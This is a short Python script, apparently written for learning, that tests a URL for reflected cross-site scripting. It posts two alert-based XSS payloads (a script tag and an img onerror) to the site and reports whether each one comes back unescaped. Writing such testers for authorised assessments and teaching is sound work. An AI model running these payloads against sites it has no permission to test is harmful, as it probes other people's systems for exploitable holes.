# hey it s Ricci here, this is a cross site scripting automated tester
# this script is  inspired by the Python Web Penetration Testing Cookbook
#
# DISCLAIMER: This tool is for educational purposes only.
# Only use on systems you own or have explicit permission to test.
# Unauthorized access to computer systems is illegal.
# it s better to do it manually with burpsuite , OWASP ZAP or in the browsers but here is a simple automated version


import sys

import requests

url = sys.argv[1]

payloads = ['<script>alert("XSS here")</script>', '<img src=x onerror=alert("XSS")>']

for payload in payloads:  # loop through payload again
    req = requests.post(url, data={"input": payload})  # send request with payload
    if payload in req.text:
        # print something if vulnerable
        print("[+] Vulnerable to Cross-Site Scripting (XSS)!")
        print("[+] Payload found in response: " + payload)
    else:
        print("[-] Not vulnerable with payload: " + payload)
